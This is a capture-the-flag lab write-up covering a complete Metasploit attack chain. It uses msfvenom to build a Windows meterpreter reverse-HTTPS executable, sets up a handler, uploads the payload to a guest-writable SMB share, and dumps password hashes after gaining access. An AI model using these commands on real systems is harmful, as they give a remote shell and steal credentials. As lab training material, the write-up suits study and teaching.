# Metasploit: Payload Generation

Before you go any deeper in the writeup no, it's not broken. PAY CLOSE ATTENTION TO THE SCENARIO DESCRIPTION. This is not experience talk at all, haha :')

> "Your team has uncovered a guest-writable share on the target Windows machine. There is a scheduled task that will run and delete any executable files uploaded to this share. The team also uncovered that the target only allows outbound HTTP/S traffic."

You're welcome.

## Payload Generation

Well, if you, like me, wasted a lot of time trying to make the meterpreter catch a session, only to realize they said in the description that the target only allows outbound HTTP/S traffic, here is the msfvenom for windows with the HTTP/S payload. I chose port 443, because HTTP/S, but you could do something like 8443.

```shell
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<LOCAL_HOST> LPORT=443 -f exe -o evil.exe
```

## Handler Session

I like to make the handler session before the payload delivery (if I know I'll be able to do the delivery due to prior tests or information). We will set the following:
- PAYLOAD -> `windows/x64/meterpreter_reverse_https`
- LHOST -> `LOCAL_HOST`
- LPORT -> `443`

```shell
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https

msf exploit(multi/handler) > set lhost <LOCAL_HOST>

msf exploit(multi/handler) > set lport 443

msf exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://<LOCAL_HOST>:443
```

## Payload Delivery

Guest writable share. So it's an SMB Share writable by a guest user. Let's list the SMB shares.

```shell
smbclient -L //<TARGET> -U "guest" --password=''
```

We will find the `public` share. So, let's use the `smb upload` module to deliver the payload.

```shell
msf > search type:auxiliary smb upload

msf > use auxiliary/admin/smb/upload_file

msf auxiliary(admin/smb/upload_file) > set smbuser guest

msf auxiliary(admin/smb/upload_file) > set smbshare public

msf auxiliary(admin/smb/upload_file) > set lpath </path/to/>evil.exe

msf auxiliary(admin/smb/upload_file) > set rpath evil.exe

msf auxiliary(admin/smb/upload_file) > set rhosts <TARGET>

msf auxiliary(admin/smb/upload_file) > exploit
```

Now it is a waiting game. The target will need to run the payload. If you want to check it, you could run `smbclient` and use `ls` to watch the payload until it is deleted. If it was deleted and nothing happened on the handler session, you did something wrong.

```shell
smbclient //<target>/public -U "guest" --password=''
```

## Post Exploitation

We can just **hashdump** the cred hashes and **search** to answer the last two questions.

Hashdump:
```shell
meterpreter > hashdump

jim:1008:aad3b435b51404eeaad3b435b51404ee:<HASH>:::
```

Flag:
```shell
meterpreter > search -f flag* -d "C:\Users\Administrator"

cat "C:\<PATH_TO>\flag.txt"
```

Sometimes, in other environments, the search meterpreter command takes too much time to run. So, if that ever happens, I recommend you jump into a `shell` and find it there.

```shell
# Windows
dir /s "string_to_search"

# Linux
find / -name "string" -type f 2>/dev/null
```

See ya later aligator 🕺
